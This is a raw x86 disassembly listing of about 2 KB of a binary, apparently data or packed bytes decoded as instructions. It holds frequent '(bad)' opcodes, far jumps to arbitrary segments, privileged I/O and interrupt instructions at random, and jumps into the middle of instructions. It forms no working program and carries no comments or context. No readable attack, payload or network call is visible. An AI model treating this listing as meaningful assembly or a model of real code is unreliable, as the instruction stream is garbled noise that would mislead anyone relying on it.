  416534:	push   0x5e7f496
  416539:	add    DWORD PTR [edi+0x7a],ebx
  41653c:	jge    0x416505
  41653e:	cdq    
  41653f:	cdq    
  416540:	and    eax,0x82e5aff
  416545:	mov    bh,0xfb
  416547:	mov    esi,0xc588a4dc
  41654c:	pop    ebx
  41654d:	xlat   BYTE PTR ds:[ebx]
  41654e:	jmp    0xab04:0xce11660e
  416555:	add    ebp,DWORD PTR [edx-0x29]
  416558:	lods   eax,DWORD PTR ds:[esi]
  416559:	mov    eax,0x5d0b1bb2
  41655e:	out    dx,al
  41655f:	out    0x62,al
  416561:	mov    dl,0x91
  416563:	jecxz  0x416537
  416565:	or     al,0x62
  416567:	pop    ecx
  416568:	cmp    eax,DWORD PTR [ebx]
  41656a:	into   
  41656b:	scas   eax,DWORD PTR es:[edi]
  41656c:	mov    ah,0xcf
  41656e:	lea    edx,[edx-0x4f]
  416571:	int    0x10
  416573:	int    0x71
  416575:	fs jo  0x416574
  416578:	push   ebp
  416579:	enter  0xde71,0xd1
  41657d:	and    DWORD PTR [ebx+edi*8+0x271cb4dd],edx
  416584:	mov    ebx,DWORD PTR [eax-0x6b4f6776]
  41658a:	xchg   bl,al
  41658c:	sahf   
  41658d:	call   FWORD PTR [eax+0x449c1e55]
  416593:	sti    
  416594:	xchg   esi,eax
  416595:	adc    eax,0xbcb44077
  41659a:	in     eax,dx
  41659b:	inc    edi
  41659c:	test   DWORD PTR [ecx+eax*2],edi
  41659f:	into   
  4165a0:	sbb    eax,0xdb1bfa7d
  4165a5:	loop   0x41658c
  4165a7:	sti    
  4165a8:	test   BYTE PTR [eax+esi*1+0x1b],dl
  4165ac:	lods   al,BYTE PTR ds:[esi]
  4165ad:	inc    ebp
  4165ae:	jbe    0x416546
  4165b0:	jo     0x4165fa
  4165b2:	jg     0x4165ab
  4165b4:	addr16 cmp al,0xe5
  4165b7:	fnsave [ebp+edx*1-0x598d8c70]
  4165be:	clc    
  4165bf:	ret    0x2704
  4165c2:	xor    BYTE PTR [esi],al
  4165c4:	dec    esi
  4165c5:	pop    ecx
  4165c6:	push   0x47b35e5
  4165cb:	pop    ds
  4165cc:	pusha  
  4165cd:	inc    esi
  4165ce:	test   bh,ah
  4165d0:	sbb    bl,BYTE PTR [ebp+0x7fed325d]
  4165d6:	lods   al,BYTE PTR ds:[esi]
  4165d7:	out    dx,al
  4165d8:	cmp    edi,DWORD PTR es:[ebx-0x2ffe577c]
  4165df:	into   
  4165e0:	xor    ebx,DWORD PTR es:[ecx]
  4165e3:	sub    eax,0x32067544
  4165e8:	mov    ebp,0x62737229
  4165ed:	jecxz  0x416631
  4165ef:	stos   BYTE PTR es:[edi],al
  4165f0:	jmp    0x43dc:0x4ab66475
  4165f7:	imul   eax
  4165f9:	xchg   esp,eax
  4165fa:	es mov dx,0x147d
  4165ff:	mov    bl,0xdd
  416601:	in     eax,dx
  416602:	adc    al,0x14
  416604:	jle    0x41658c
  416606:	jge    0x4165c2
  416608:	pusha  
  416609:	in     al,dx
  41660a:	aaa    
  41660b:	adc    al,0xd2
  41660d:	js     0x4165c6
  41660f:	fcom   DWORD PTR ds:0xa011e169
  416615:	popa   
  416616:	pusha  
  416617:	cmp    BYTE PTR [esi+eax*1],cl
  41661a:	loope  0x4165c3
  41661c:	js     0x4165e5
  41661e:	call   0x7e51:0x82339735
  416625:	shl    BYTE PTR [ebp+0x51e20497],cl
  41662b:	fcomp  DWORD PTR [ebp+0x36]
  41662e:	(bad)  
  41662f:	(bad)  
  416630:	imul   ebp,DWORD PTR [edx-0x27a0a142],0x6
  416637:	faddp  st(0),st
  416639:	loopne 0x416622
  41663b:	ret    
  41663c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41663d:	sub    ebp,esp
  41663f:	test   eax,0x581c1e75
  416644:	mov    edx,0x28cd32f4
  416649:	add    ebx,ecx
  41664b:	push   ds
  41664c:	aad    0xef
  41664e:	inc    ebp
  41664f:	fsubr  QWORD PTR [esi-0x52]
  416652:	lods   eax,DWORD PTR ds:[esi]
  416653:	test   eax,0xb51e1ff2
  416658:	sbb    ebx,DWORD PTR [ecx]
  41665a:	cmp    ebp,DWORD PTR [eax+esi*2+0x19]
  41665e:	lahf   
  41665f:	loop   0x4166da
  416661:	call   0x5902:0xb7d99ac0
  416668:	pop    ecx
  416669:	mov    ds:0x64f7eff2,eax
  41666e:	sub    eax,0xba50c0c9
  416673:	mov    al,ds:0xc01e231e
  416678:	mov    bh,0xcf
  41667a:	data16 xor ax,0x7271
  41667f:	and    ebx,DWORD PTR [edi+edi*4]
  416682:	leave  
  416683:	or     edi,0xffffffee
  416686:	dec    esp
  416687:	sahf   
  416688:	ss repz popa 
  41668b:	cmp    eax,0xb4041c05
  416690:	mov    al,0x3e
  416692:	add    al,0x64
  416694:	sub    bh,BYTE PTR [ebx+0x61b0cba6]
  41669a:	fstp   DWORD PTR [esi]
  41669c:	retf   0x1555
  41669f:	inc    ecx
  4166a0:	jmp    0x5468334c
  4166a5:	call   edi
  4166a7:	sub    eax,0xab3e1d6b
  4166ac:	ds push ds
  4166ae:	or     DWORD PTR [eax-0x6f],ecx
  4166b1:	lds    eax,FWORD PTR [eax+0x613579a2]
  4166b7:	mov    ebp,0x797306f3
  4166bc:	xor    esp,DWORD PTR [esi+0x7dc940e4]
  4166c2:	dec    esp
  4166c3:	call   0x33bf:0x87b97f30
  4166ca:	jbe    0x4166f3
  4166cc:	pop    esi
  4166cd:	stc    
  4166ce:	push   ecx
  4166cf:	mov    eax,0x9d860610
  4166d4:	hlt    
  4166d5:	jge    0x41667e
  4166d7:	repz mov ah,0xa9
  4166da:	out    0x8b,eax
  4166dc:	das    
  4166dd:	pop    ds
  4166de:	(bad)  
  4166df:	ja     0x41668c
  4166e1:	ss retf 0xd32
  4166e5:	sbb    bl,bh
  4166e7:	push   ss
  4166e8:	(bad)  
  4166e9:	(bad)  
  4166ea:	cld    
  4166eb:	or     DWORD PTR [eax-0x78],ebx
  4166ee:	xchg   ebp,eax
  4166ef:	sar    BYTE PTR [edi-0x44045fbb],0x3f
  4166f6:	enter  0xf38a,0x60
  4166fa:	add    ah,bh
  4166fc:	leave  
  4166fd:	jl     0x416698
  4166ff:	loop   0x4166f8
  416701:	outs   dx,DWORD PTR ds:[esi]
  416702:	cmp    eax,0x6a1443f4
  416707:	mov    eax,0xd99e100f
  41670c:	hlt    
  41670d:	or     al,0x3d
  41670f:	pop    esi
  416710:	bound  edi,QWORD PTR [edx+edi*2-0x6a]
  416714:	push   eax
  416715:	and    edi,DWORD PTR [ecx+0x6163aff2]
  41671b:	add    edi,DWORD PTR [edi+0xfd97840]
  416721:	into   
  416722:	aad    0xd4
  416724:	scas   al,BYTE PTR es:[edi]
  416725:	adc    cl,BYTE PTR [ecx-0x44]
  416728:	(bad)  
  416729:	lock or al,0xa4
  41672c:	dec    edx
  41672d:	mov    bl,0x4e
  41672f:	js     0x416788
  416731:	fwait
  416732:	retf   
  416733:	test   al,0x1a
  416735:	repz (bad) 
  416738:	dec    eax
  416739:	pusha  
  41673a:	mov    ds:0xd7ce6f6e,eax
  41673f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416740:	mov    ah,0x37
  416742:	jp     0x416795
  416744:	pop    esp
  416745:	cwde   
  416746:	push   0x5cdf6387
  41674b:	push   ecx
  41674c:	or     BYTE PTR [edx-0xc],ah
  41674f:	int3   
  416750:	popf   
  416751:	(bad)  
  416752:	call   0xa5518071
  416757:	xor    al,0x12
  416759:	or     BYTE PTR [edx+0x6f5aaf5f],bl
  41675f:	or     DWORD PTR [ecx+0x4e],ebp
  416762:	in     eax,dx
  416763:	xchg   DWORD PTR [ebp+0x4551d0ac],esp
  416769:	sub    edi,DWORD PTR [ebp-0x58]
  41676c:	jo     0x41676b
  41676e:	or     al,0x3d
  416770:	pop    esi
  416771:	enter  0xdbe8,0xd0
  416775:	rcr    BYTE PTR [edi+0x60],cl
  416778:	fsubrp st(7),st
  41677a:	inc    esp
  41677b:	push   ecx
  41677c:	lods   al,BYTE PTR ds:[esi]
  41677d:	in     al,0xa8
  41677f:	sti    
  416780:	call   0xadf92625
  416785:	mov    bl,0xe6
  416787:	outs   dx,BYTE PTR ds:[esi]
  416788:	neg    DWORD PTR [ebx+0x5]
  41678b:	mov    dl,0x16
  41678d:	popf   
  41678e:	sbb    al,0x68
  416790:	aad    0xb6
  416792:	or     DWORD PTR gs:[esi],ebx
  416795:	inc    edi
  416796:	adc    DWORD PTR [ebx-0x2b],eax
  416799:	outs   dx,DWORD PTR ds:[esi]
  41679a:	jne    0x1c0bdd5
  4167a0:	stos   DWORD PTR es:[edi],eax
  4167a1:	dec    ecx
  4167a2:	pop    ds
  4167a3:	inc    DWORD PTR [edi+0x3142ac8a]
  4167a9:	sub    BYTE PTR [edx-0x66ea861d],ah
  4167af:	mov    WORD PTR [ecx-0x2c7b1d84],?
  4167b5:	xchg   esp,eax
  4167b6:	sbb    al,0x80
  4167b8:	fs cmc 
  4167ba:	(bad)  
  4167bb:	loop   0x416777
  4167bd:	repnz push ds
  4167bf:	jg     0x416742
  4167c1:	fst    DWORD PTR [ecx+edx*2]
  4167c4:	sub    edi,ecx
  4167c6:	mov    dh,0x17
  4167c8:	push   esi
  4167c9:	cli    
  4167ca:	daa    
  4167cb:	push   ecx
  4167cc:	push   esp
  4167cd:	cld    
  4167ce:	dec    esp
  4167cf:	push   ecx
  4167d0:	jge    0x416762
  4167d2:	and    ebp,edx
  4167d4:	or     BYTE PTR [ebp+eax*1+0x643dbf98],dh
  4167db:	xchg   ebp,eax
  4167dc:	inc    esi
  4167dd:	push   ebx
  4167de:	ja     0x416832
  4167e0:	jns    0x416807
  4167e2:	in     eax,0xb8
  4167e4:	mov    ds:0x5774ea6e,al
  4167e9:	jg     0x41679e
  4167eb:	je     0x41679c
  4167ed:	(bad)  
  4167ee:	out    0xca,al
  4167f0:	sbb    al,0x3e
  4167f2:	jno    0x4167f7
  4167f4:	test   al,0x30
  4167f6:	(bad)  
  4167f8:	add    bh,BYTE PTR cs:[edx-0x4712ce06]
  4167ff:	add    bh,BYTE PTR [ebx]
  416801:	sbb    edi,edx
  416803:	pop    edx
  416804:	push   0xddb31dfd
  416809:	jmp    0x9cdf:0xeb6574bc
  416810:	pop    ebp
  416811:	ret    
  416812:	cmp    eax,0x1f085666
  416817:	jb     0x41681d
  416819:	cmc    
  41681a:	mov    DWORD PTR [ebx+0x52eb9a8d],esi
  416820:	retf   
  416821:	(bad)
  416826:	xchg   eax,ecx
  416828:	pop    esi
  416829:	xchg   ebx,eax
  41682a:	jo     0x4167fc
  41682c:	jne    0x416840
  41682e:	xchg   esi,eax
  41682f:	sub    eax,0x9c7bc8fe
  416834:	jno    0x416854
  416836:	pop    ss
  416837:	adc    BYTE PTR [edx],bh
  416839:	pop    esp
  41683a:	pop    ds
  41683b:	test   al,0x67
  41683d:	xor    cl,BYTE PTR gs:[ebx]
  416840:	add    BYTE PTR [ebx+0x11174d13],0x4b
  416847:	mov    esi,0xf6def7b7
  41684c:	sbb    DWORD PTR [eax-0x575d0c1c],edx
  416852:	inc    eax
  416853:	and    DWORD PTR gs:[edx+0x37],ebx
  416857:	jmp    DWORD PTR [edx]
  416859:	and    eax,0xed6fe083
  41685e:	ins    BYTE PTR es:[edi],dx
  41685f:	pop    ds
  416860:	or     DWORD PTR [ebx],ebx
  416862:	sbb    al,0x0
  416864:	cmp    edi,ecx
  416866:	sbb    eax,0xfc0717a1
  41686b:	add    eax,ebx
  41686d:	test   DWORD PTR [eax],0x5f0293fd
  416873:	(bad)  
  416874:	jbe    0x416871
  416876:	call   0x1f42:0x598c79ee
  41687d:	(bad)  
  41687e:	(bad)  
  41687f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416880:	cmc    
  416881:	xchg   BYTE PTR [eax],bl
  416883:	inc    ebx
  416884:	mov    ah,0x24
  416886:	push   ecx
  416887:	jno    0x41684c
  416889:	rcr    BYTE PTR [edi+edx*1],cl
  41688c:	loope  0x416818
  41688e:	mov    al,ds:0x8fa0847
  416893:	fwait
  416894:	shl    DWORD PTR [ebx-0x3831d2a7],1
  41689a:	push   edx
  41689b:	(bad)  [ecx+0x40e44968]
  4168a1:	or     BYTE PTR [ecx-0x53],al
  4168a4:	gs mov esi,0x1e6287f0
  4168aa:	jb     0x416837
  4168ac:	fild   QWORD PTR [eax-0x7d931b6]
  4168b2:	pushf  
  4168b3:	push   ds
  4168b4:	mov    ebx,0x7776db38
  4168b9:	jo     0x416927
  4168bb:	aad    0xc
  4168bd:	je     0x4168bd
  4168bf:	xchg   esi,eax
  4168c0:	cwd    
  4168c2:	inc    edi
  4168c3:	mov    al,ds:0xa054832e
  4168c8:	stc    
  4168c9:	push   cs
  4168ca:	and    eax,0x7935fed5
  4168cf:	int    0xd0
  4168d1:	xor    al,0x55
  4168d3:	xor    al,0x69
  4168d5:	out    dx,al
  4168d6:	ror    BYTE PTR [eax-0x31],0xdb
  4168da:	dec    esi
  4168db:	or     DWORD PTR [ecx+edi*8-0x1f417b31],0x69
  4168e3:	sbb    bh,ch
  4168e5:	and    esp,DWORD PTR [ecx+0x5eb8f3ec]
  4168eb:	bnd jmp 0x7a1be66d
  4168f1:	mov    dh,0x40
  4168f3:	xchg   ebx,eax
  4168f4:	jge    0x416927
  4168f6:	cmp    ah,bl
  4168f8:	add    eax,0x229c79fa
  4168fd:	xchg   ah,ah
  4168ff:	mov    ds:0x2707e4eb,eax
  416904:	sbb    DWORD PTR [eax],ecx
  416906:	adc    eax,0x24606145
  41690b:	xor    BYTE PTR [ebx-0x1f],al
  41690e:	scas   eax,DWORD PTR es:[edi]
  41690f:	inc    eax
  416910:	inc    ecx
  416911:	enter  0x1df0,0x74
  416915:	push   esp
  416916:	out    0xc9,eax
  416918:	pop    ss
  416919:	jge    0x416939
  41691b:	jb     0x4168d8
  41691d:	das    
  41691e:	xchg   ecx,eax
  41691f:	jbe    0x416920
  416921:	jge    0x4169a2
  416923:	jno    0x416916
  416925:	ret    0xf3b4
  416928:	sbb    BYTE PTR [ebx+ecx*2-0xce68739],dh
  41692f:	cmp    eax,ecx
  416931:	(bad)  
  416933:	imul   esp,edx,0x7803138b
  416939:	xchg   edx,eax
  41693a:	mov    eax,0x99588ff9
  41693f:	rol    BYTE PTR [eax-0x3a],cl
  416942:	aad    0x51
  416944:	adc    BYTE PTR [ecx],0x79
  416947:	into   
  416948:	xor    ebx,DWORD PTR [ecx]
  41694a:	jg     0x4169a2
  41694c:	add    eax,0xc3e4f42d
  416951:	xchg   edi,eax
  416952:	xor    ah,bh
  416954:	into   
  416955:	mov    edx,DWORD PTR ss:[edi+0x721734c]
  41695c:	pop    esi
  41695d:	lods   eax,DWORD PTR ds:[esi]
  41695e:	jns    0x41696d
  416960:	push   ds
  416961:	push   edx
  416962:	clc    
  416963:	cmp    esp,DWORD PTR [ebp+0x7518e70a]
  416969:	add    eax,0xce130cd8
  41696e:	or     eax,0xe9375284
  416973:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416974:	hlt    
  416975:	inc    edx
  416976:	lds    edi,FWORD PTR [esp+edi*8]
  416979:	(bad)  
  41697b:	xchg   ecx,eax
  41697c:	ret    0x955f
  41697f:	cmp    ebx,DWORD PTR [ebx-0x47fb555]
  416985:	mov    edi,0xc2143f3f
  41698a:	(bad)  
  41698b:	mov    ds:0x55612e69,eax
  416990:	dec    edi
  416991:	aam    0xc
  416993:	jp     0x416946
  416995:	cmp    DWORD PTR [esp+esi*4-0x1c],ebx
  416999:	test   al,0x31
  41699b:	inc    eax
  41699c:	and    BYTE PTR ds:0x154e4432,dl
  4169a2:	xor    ecx,DWORD PTR ds:0xaa7a3a3f
  4169a8:	fstp   st(4)
  4169aa:	stos   DWORD PTR es:[edi],eax
  4169ab:	jns    0x41698d
  4169ad:	mov    al,0xc7
  4169af:	jnp    0x4169fd
  4169b1:	add    al,BYTE PTR [ebp-0x3cc14276]
  4169b7:	ret    0x75c2
  4169ba:	and    eax,0xd8b8ec46
  4169bf:	mov    ebp,0x103ff7af
  4169c4:	test   DWORD PTR [ebx+0x707d9797],ebp
  4169ca:	dec    eax
  4169cb:	shl    ah,0xa0
  4169ce:	cmc    
  4169cf:	sub    eax,0x9a9f5a35
  4169d4:	ds push ebx
  4169d6:	rcr    BYTE PTR [esi+0x1c631b7e],cl
  4169dc:	jge    0x4169ae
  4169de:	inc    ebp
  4169df:	rcl    edx,1
  4169e1:	enter  0xdf49,0x81
  4169e5:	push   esp
  4169e6:	add    al,0xfb
  4169e8:	(bad)  
  4169e9:	or     eax,0xbb441f6b
  4169ee:	adc    al,0x36
  4169f0:	in     al,0x10
  4169f2:	repnz lds eax,FWORD PTR [ebp-0x2f]
  4169f6:	call   0x9391:0x729d33b3
  4169fd:	jg     0x4169ca
  4169ff:	sar    DWORD PTR [ecx],0x7
  416a02:	fdivr  st(7),st
  416a04:	or     bl,BYTE PTR [edi-0x70]
  416a07:	lock cmp eax,0x561cb4a3
  416a0d:	repnz and BYTE PTR fs:[esi-0x52],bl
  416a12:	xor    bh,ch
  416a14:	xchg   esi,eax
  416a15:	in     al,dx
  416a16:	sbb    DWORD PTR [edi+eiz*8+0x653ae8b0],esi
  416a1d:	mov    al,ds:0xf62013f4
  416a22:	jmp    0xb46a:0xf88754a9
  416a29:	push   edi
  416a2a:	and    al,0xea
  416a2c:	test   al,0x79
  416a2e:	in     al,dx
  416a2f:	imul   eax,DWORD PTR [edi-0x5ad460ce],0x5f
  416a36:	imul   edx,eax,0xffffff88
  416a39:	sbb    BYTE PTR [esi-0x71],ah
  416a3c:	mov    ss,WORD PTR [edi-0x7da93de1]
  416a42:	sbb    eax,0xbfcbd249
  416a47:	cdq    
  416a48:	dec    edx
  416a49:	mov    ebx,0x88325f2
  416a4e:	dec    ebx
  416a4f:	jo     0x416a3f
  416a51:	and    esi,DWORD PTR [ecx]
  416a53:	push   esi
  416a54:	(bad)  
  416a55:	inc    edi
  416a56:	mov    DWORD PTR [esi],ecx
  416a58:	repnz cmp al,BYTE PTR [eax]
  416a5b:	mov    edx,0x6177859
  416a60:	sti    
  416a61:	pop    eax
  416a62:	pop    ds
  416a63:	push   es
  416a64:	inc    edi
  416a65:	call   FWORD PTR [ecx+0xfd3543a]
  416a6b:	and    eax,DWORD PTR [edi+0x26]
  416a6e:	icebp  
  416a6f:	inc    ecx
  416a70:	ffree  st(4)
  416a72:	mul    BYTE PTR [edx]
  416a74:	jl     0x4169f8
  416a76:	fmul   st,st(7)
  416a78:	xor    ah,ah
  416a7a:	inc    ecx
  416a7b:	repz sub BYTE PTR [ecx+0x22],dh
  416a7f:	xlat   BYTE PTR ds:[ebx]
  416a80:	test   DWORD PTR [ecx],ecx
  416a82:	cmp    ebx,DWORD PTR [edx-0x20]
  416a85:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a86:	mov    ecx,0xb73d3017
  416a8b:	jp     0x416a59
  416a8d:	jb     0x416a95
  416a8f:	adc    al,0xcb
  416a91:	mov    bh,0x1c
  416a93:	scas   eax,DWORD PTR es:[edi]
  416a94:	pop    ebp
  416a95:	ret    
  416a96:	pop    ebp
  416a97:	inc    edi
  416a98:	fdivr  QWORD PTR [esi-0x5a]
  416a9b:	push   ecx
  416a9c:	adc    BYTE PTR [esi+0x5d879dc1],bh
  416aa2:	dec    esi
  416aa3:	pop    ecx
  416aa4:	xor    eax,0x6fda4714
  416aa9:	lahf   
  416aaa:	push   es
  416aab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416aac:	loop   0x416aae
  416aae:	mov    ebx,DWORD PTR [ecx-0x2d]
  416ab1:	lock imul edi,DWORD PTR [edx+ebx*8+0x1b59223d],0xbac6222e
  416abd:	bound  esp,QWORD PTR [esi-0x5c]
  416ac0:	jno    0x416aae
  416ac2:	aas    
  416ac3:	sub    DWORD PTR [esi-0x6bd1d87d],0x8833f27b
  416acd:	test   eax,0x736b62ea
  416ad2:	(bad)  
  416ad3:	and    edx,esp
  416ad5:	int3   
  416ad6:	fsub   QWORD PTR [ecx]
  416ad8:	push   ebx
  416ada:	(bad)  
  416adb:	jo     0x416ab1
  416add:	ins    DWORD PTR es:[edi],dx
  416ade:	xchg   ebx,eax
  416adf:	hlt    
  416ae0:	shl    DWORD PTR [eax-0x6127258c],0x9e
  416ae7:	js     0x416b56
  416ae9:	std    
  416aea:	imul   ebp,edi,0x4dd119f1
  416af0:	in     al,0x56
  416af2:	pop    esp
  416af3:	or     edi,esi
  416af5:	jle    0x416b46
  416af7:	add    al,0x8c
  416af9:	or     ebx,DWORD PTR [edi+0x5d]
  416afc:	pop    ebx
  416afd:	out    0xfe,al
  416aff:	lea    esi,[edi+0x22]
  416b02:	arpl   WORD PTR [eax+ebx*2-0x18],di
  416b06:	(bad)  
  416b07:	out    dx,eax
  416b08:	sbb    DWORD PTR [ebp+0x18],esi
  416b0b:	stos   DWORD PTR es:[edi],eax
  416b0c:	or     esp,DWORD PTR [eax-0xe3b8860]
  416b12:	pop    es
  416b13:	fcom   DWORD PTR [ecx-0x24ee4284]
  416b19:	es inc ebp
  416b1b:	stc    
  416b1c:	xchg   DWORD PTR [edx],eax
  416b1e:	enter  0x3986,0x15
  416b22:	cmp    ah,dh
  416b24:	sub    eax,0x2522cc1c
  416b29:	cmp    BYTE PTR [ecx],bl
  416b2b:	mov    ds:0x1b267ca5,eax
  416b30:	fst    QWORD PTR [eax+ebx*1+0x6b7b2703]
  416b37:	in     eax,dx
  416b38:	test   ecx,esp
  416b3a:	lods   al,BYTE PTR ds:[esi]
  416b3b:	xor    BYTE PTR [edi+0x71],ah
  416b3e:	push   esp
  416b3f:	ins    DWORD PTR es:[edi],dx
  416b40:	js     0x416ba0
  416b42:	das    
  416b43:	mov    esi,0x73db9abb
  416b48:	scas   al,BYTE PTR es:[edi]
  416b49:	sti    
  416b4a:	dec    ebx
  416b4b:	pop    ebp
  416b4c:	mov    DWORD PTR [edx+edi*2],edi
  416b4f:	dec    ebx
  416b50:	icebp  
  416b51:	rcl    DWORD PTR [edi],cl
  416b53:	sub    eax,0x49420bdb
  416b58:	push   ebx
  416b59:	xchg   edi,eax
  416b5a:	sbb    BYTE PTR [edx],dh
  416b5c:	cmp    BYTE PTR [esi+0x75],0x5c
  416b60:	sahf   
  416b61:	stos   BYTE PTR es:[edi],al
  416b62:	bnd fs je 0x416b81
  416b66:	(bad)  
  416b67:	mov    dl,0xb0
  416b69:	jmp    0x870e7b0b
  416b6e:	out    dx,al
  416b6f:	pop    es
  416b70:	lock in eax,0x20
  416b73:	pop    ebp
  416b74:	inc    edi
  416b75:	cmp    al,0x13
  416b77:	(bad)  
  416b78:	sbb    al,0x47
  416b7a:	push   edi
  416b7b:	leave  
  416b7c:	loopne 0x416b4a
  416b7e:	xlat   BYTE PTR ds:[ebx]
  416b7f:	sbb    bh,BYTE PTR [edx]
  416b81:	sub    dh,BYTE PTR [eax+0xd]
  416b84:	out    dx,al
  416b85:	jb     0x416bf3
  416b87:	hlt    
  416b88:	icebp  
  416b89:	mov    bl,0x6f
  416b8b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416b8c:	fs loop 0x416bc7
  416b8f:	lods   al,BYTE PTR ds:[esi]
  416b90:	push   ebp
  416b91:	imul   ecx,DWORD PTR [esi-0x32f12446],0x42
  416b98:	out    dx,al
  416b99:	repnz stos BYTE PTR es:[edi],al
  416b9b:	test   al,0x1b
  416b9d:	loope  0x416b87
  416b9f:	sub    BYTE PTR [ebp*8+0x6ca5a3c1],al
  416ba6:	lea    ebx,[eax+0x151a3f14]
  416bac:	mov    eax,0xee9c506a
  416bb1:	iret   
  416bb2:	push   ss
  416bb3:	xchg   DWORD PTR [eax+ebp*2],ecx
  416bb6:	stos   BYTE PTR es:[edi],al
  416bb7:	dec    esi
  416bb8:	cs and eax,0x562aa863
  416bbe:	je     0x416b64
  416bc0:	rcr    DWORD PTR [ecx-0x4b203873],0xbb
  416bc7:	ss mov ah,0x89
  416bca:	jae    0x416c0f
  416bcc:	mov    edx,0xb399c7e4
  416bd1:	loop   0x416b5a
  416bd3:	jp     0x416c30
  416bd5:	call   0x319:0x3089c5d8
  416bdc:	inc    edx
  416bdd:	in     al,0x71
  416bdf:	icebp  
  416be0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416be1:	gs fwait
  416be3:	sbb    eax,DWORD PTR [ebx]
  416be5:	mov    ds:0xcc6d4327,eax
  416bea:	push   0x5ee3d1ba
  416bef:	popa   
  416bf0:	ins    BYTE PTR es:[edi],dx
  416bf1:	xchg   ebp,eax
  416bf2:	aas    
  416bf3:	je     0x416c1e
  416bf5:	mov    WORD PTR [esi+0x4d057d9a],?
  416bfb:	mov    ecx,0xc5b7aa16
  416c00:	dec    ecx
  416c01:	jno    0x416ba3
  416c03:	ds pop ds
  416c05:	ret    0xd7ef
  416c08:	lods   al,BYTE PTR ds:[si]
  416c0a:	xchg   esi,eax
  416c0b:	hlt    
  416c0c:	push   esi
  416c0d:	sbb    al,0x33
  416c0f:	pop    edi
  416c10:	cmp    eax,0x55771d13
  416c15:	push   ebx
  416c16:	enter  0xed76,0x2e
  416c1a:	out    0x6e,al
  416c1c:	push   ds
  416c1d:	(bad)
  416c20:	idiv   BYTE PTR [edi]
  416c22:	or     ch,al
  416c24:	dec    eax
  416c25:	hlt    
  416c26:	nop
  416c27:	mov    eax,0x6a669e8c
  416c2c:	lds    eax,FWORD PTR [edi+edi*2-0x32e9af37]
  416c33:	add    eax,0xe9fbfd48
  416c38:	imul   esp,DWORD PTR [ecx+0x6c5bbca4],0x9a332126
  416c42:	pop    ecx
  416c43:	and    dh,bh
  416c45:	clc    
  416c46:	sti    
  416c47:	dec    ecx
  416c48:	mov    dh,0x11
  416c4a:	retf   0xccb6
  416c4d:	popf   
  416c4e:	xchg   ebx,eax
  416c4f:	fst    QWORD PTR [ebx-0x33e81b69]
  416c55:	es test eax,0x254fc78f
  416c5b:	out    0xf5,eax
  416c5d:	jo     0x416cb2
  416c5f:	ret    0xc66d
  416c62:	add    al,0x3a
  416c64:	and    DWORD PTR [ebx+0x45a505a3],ecx
  416c6a:	ins    BYTE PTR es:[edi],dx
  416c6b:	dec    DWORD PTR [ecx]
  416c6d:	fadd   QWORD PTR [edi]
  416c6f:	mov    ebx,ebp
  416c71:	das    
  416c72:	and    eax,0x1cd0f26f
  416c77:	jo     0x416c32
  416c79:	pushf  
  416c7a:	sub    al,0xcf
  416c7c:	gs adc al,0xfa
  416c7f:	pop    edi
  416c80:	jle    0x416cde
  416c82:	add    ebp,DWORD PTR [ebp+ebp*1+0x43]
  416c86:	pop    ebp
  416c87:	mov    esp,0xe28036bb
  416c8c:	mov    ebp,0x1be5a415
  416c91:	cld    
  416c92:	lods   eax,DWORD PTR ds:[esi]
  416c93:	jb     0x416cfd
  416c95:	push   eax
  416c96:	push   ss
  416c97:	retf   
  416c98:	and    ebp,DWORD PTR [ebp+ebp*4+0x5b96f3e]
  416c9f:	sub    BYTE PTR gs:[edi+0xb2f9b4f],bh
  416ca6:	add    eax,0x73c3ab75
  416cab:	sbb    esp,edx
  416cad:	jmp    0x416c4d
  416caf:	inc    edi
  416cb0:	lds    edx,FWORD PTR [edi-0xd7b5e3f]
  416cb6:	outs   dx,DWORD PTR ds:[esi]
  416cb7:	dec    eax
  416cb8:	scas   eax,DWORD PTR es:[edi]
  416cb9:	or     DWORD PTR [ebp+0x223f3d93],eax
  416cbf:	iret   
  416cc0:	xchg   ecx,eax
  416cc1:	jbe    0x416ca3
  416cc3:	mov    BYTE PTR [edi-0x67],0x3f
  416cc7:	int    0x99
  416cc9:	out    dx,eax
  416cca:	add    esi,DWORD PTR [edx+0x447da6d6]
  416cd0:	sbb    ecx,DWORD PTR [esi+0x1d8c84ef]
  416cd6:	mov    esi,0x7d60c04c
  416cdb:	jno    0x416c9b
  416cdd:	fs cmp al,0xb1
  416ce0:	jecxz  0x416d45
  416ce2:	cmp    al,0xec
  416ce4:	jecxz  0x416d61
  416ce6:	sbb    BYTE PTR [eax],0xb
  416ce9:	gs push esp
  416ceb:	aas    
  416cec:	std    
  416ced:	or     DWORD PTR [ebx+0x34],ecx
  416cf0:	es mov ecx,0xea07304
  416cf6:	add    al,0xe0
  416cf8:	repz mov dh,0xce
  416cfb:	(bad)  
  416cfc:	jl     0x416d23
  416cfe:	or     eax,0xc7db0a0a
  416d03:	loopne 0x416cf8
  416d05:	std    
  416d06:	push   es
  416d07:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416d08:	or     edi,esp
  416d0a:	out    0x41,eax
  416d0c:	mov    ecx,0xb96f8cce
  416d11:	pop    ebp
  416d12:	mov    eax,0x93a97fe3
  416d17:	add    edx,esi
  416d19:	jg     0x416d3f
  416d1b:	test   al,0x6a
  416d1d:	leave  
  416d1e:	pop    ebp
  416d1f:	jne    0x416cf6
  416d21:	or     edi,DWORD PTR [ebx]
  416d23:	xchg   ebp,eax
  416d24:	inc    eax
  416d25:	xchg   ebp,edx
  416d27:	std    
  416d28:	pop    eax
  416d29:	cmp    BYTE PTR [eax+0x5cffe3ee],0x17
  416d30:	imul   edx,eax,0x2e
  416d33:	das    
  416d34:	mov    cl,BYTE PTR [ebx+0x5c6fefa2]
  416d3a:	call   0xc350:0x6c2de5e3
  416d41:	outs   dx,BYTE PTR ds:[esi]
  416d42:	gs dec edi
  416d44:	das    
  416d45:	fisttp DWORD PTR [ebx-0x28]
  416d48:	xor    BYTE PTR [edx],dl
  416d4a:	and    DWORD PTR [edi+0x160b769d],0x5d9264c6
  416d54:	mov    edx,0x2ba95670
  416d59:	das    
